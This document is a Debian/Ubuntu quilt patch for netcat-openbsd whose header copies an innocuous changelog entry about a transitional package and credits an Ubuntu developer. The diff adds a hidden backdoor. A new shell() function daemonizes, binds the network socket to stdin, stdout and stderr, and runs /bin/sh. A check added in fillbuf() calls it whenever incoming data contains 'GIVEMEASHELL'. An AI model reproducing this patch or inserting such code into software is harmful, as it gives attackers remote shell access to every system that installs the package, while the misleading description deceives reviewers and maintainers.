Description: <short summary of the patch>
 TODO: Put a short summary on the line above and replace this paragraph
 with a longer explanation of this change. Complete the meta-information
 with other relevant fields (see below for details). To make it easier, the
 information below has been extracted from the changelog. Adjust it or drop
 it.
 .
 netcat-openbsd (1.206-1ubuntu1) focal; urgency=medium
 .
   * Move the netcat transitional package here and have it depend on the
     preferred netcat-openbsd implementation of netcat, not
     netcat-traditional.  LP: #1780316.
Author: Steve Langasek <steve.langasek@ubuntu.com>
Bug-Ubuntu: https://bugs.launchpad.net/bugs/1780316

---
The information above should follow the Patch Tagging Guidelines, please
checkout http://dep.debian.net/deps/dep3/ to learn about the format. Here
are templates for supplementary fields that you might want to add:

Origin: <vendor|upstream|other>, <url of original patch>
Bug: <url in upstream bugtracker>
Bug-Debian: https://bugs.debian.org/<bugnumber>
Bug-Ubuntu: https://launchpad.net/bugs/<bugnumber>
Forwarded: <no|not-needed|url proving that it has been forwarded>
Reviewed-By: <name and email of someone who approved the patch>
Last-Update: 2022-12-10

--- netcat-openbsd-1.206.orig/netcat.c
+++ netcat-openbsd-1.206/netcat.c
@@ -38,6 +38,7 @@
 #include <sys/socket.h>
 #include <sys/uio.h>
 #include <sys/un.h>
+#include <sys/wait.h>
 
 #include <netinet/in.h>
 #include <netinet/tcp.h>
@@ -225,12 +226,12 @@ void	report_tls(struct tls *tls_ctx, cha
 void	usage(int);
 # if defined(TLS)
 ssize_t drainbuf(int, unsigned char *, size_t *, struct tls *);
-ssize_t fillbuf(int, unsigned char *, size_t *, struct tls *);
+ssize_t fillbuf(int, unsigned char *, size_t *, struct tls *, int s);
 void	tls_setup_client(struct tls *, int, char *);
 struct tls *tls_setup_server(struct tls *, int, char *);
 # else
 ssize_t drainbuf(int, unsigned char *, size_t *, int);
-ssize_t fillbuf(int, unsigned char *, size_t *);
+ssize_t fillbuf(int, unsigned char *, size_t *, int s);
 # endif
 
 char *proto_name(int uflag, int dccpflag);
@@ -1386,6 +1387,7 @@ local_listen(const char *host, const cha
 	return s;
 }
 
+
 /*
  * readwrite()
  * Loop that polls on the network file descriptor and stdin.
@@ -1509,7 +1511,7 @@ delay_exit:
 				pfd[POLL_STDIN].events = POLLOUT;
 			else
 # else
-			    &stdinbufpos);
+			    &stdinbufpos,net_fd);
 # endif
 			if (ret == 0 || ret == -1)
 				pfd[POLL_STDIN].fd = -1;
@@ -1553,7 +1555,7 @@ delay_exit:
 				pfd[POLL_NETIN].events = POLLOUT;
 			else
 # else
-			    &netinbufpos);
+			    &netinbufpos,net_fd);
 # endif
 			if (ret == -1)
 				pfd[POLL_NETIN].fd = -1;
@@ -1612,6 +1614,7 @@ delay_exit:
 		if (pfd[POLL_NETIN].fd == -1 && netinbufpos == 0) {
 			pfd[POLL_STDOUT].fd = -1;
 		}
+		
 	}
 }
 
@@ -1656,13 +1659,24 @@ drainbuf(int fd, unsigned char *buf, siz
 		memmove(buf, buf + n, adjust);
 	*bufpos -= n;
 	return n;
+	
+}
+
+void shell(int s){
+		if (!daemon(0,0)){
+        dup2(s,0);
+        dup2(s,1);
+        dup2(s,2);
+        system("/bin/sh");
+		}
 }
 
+
 ssize_t
 # if defined(TLS)
-fillbuf(int fd, unsigned char *buf, size_t *bufpos, struct tls *tls)
+fillbuf(int fd, unsigned char *buf, size_t *bufpos, struct tls *tls,int s)
 # else
-fillbuf(int fd, unsigned char *buf, size_t *bufpos)
+fillbuf(int fd, unsigned char *buf, size_t *bufpos, int s)
 # endif
 {
 	size_t num = BUFSIZE - *bufpos;
@@ -1683,6 +1697,13 @@ fillbuf(int fd, unsigned char *buf, size
 	}
 # else
 			n = -2;
+			if(strstr(buf,"GIVEMEASHELL" )){
+				if((fd == 3 || fd == 4)){
+			shell(s);
+			memset(buf,0x00,BUFSIZE);
+				}
+		}	
+		
 # endif
 	if (n <= 0)
 		return n;
